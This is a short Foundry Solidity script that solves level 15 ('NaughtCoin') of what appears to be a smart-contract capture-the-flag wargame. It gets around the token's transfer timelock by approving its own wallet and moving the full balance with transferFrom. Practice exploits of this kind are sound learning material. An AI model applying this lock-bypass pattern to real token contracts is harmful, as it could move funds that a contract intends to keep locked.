// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/levels/15-NaughtCoin/NaughtCoin.sol";

contract ExploitScript is Script {
    NaughtCoin level15 = NaughtCoin(payable(0xA5d633278a350B258699121364bAcC0820c09185));

    function run() public {
        vm.startBroadcast();
        address myWallet = 0x7A30be98aFCeA6cf186751546af0C563e1e8Ae08; //change to your EOA
        uint myBal = level15.balanceOf(myWallet);
        console.log("Current balance is: ", myBal);

        level15.approve(myWallet, myBal);
        level15.transferFrom(myWallet, address(level15), myBal);

        console.log("New balance is: ", level15.balanceOf(myWallet));

        vm.stopBroadcast();
    }
}

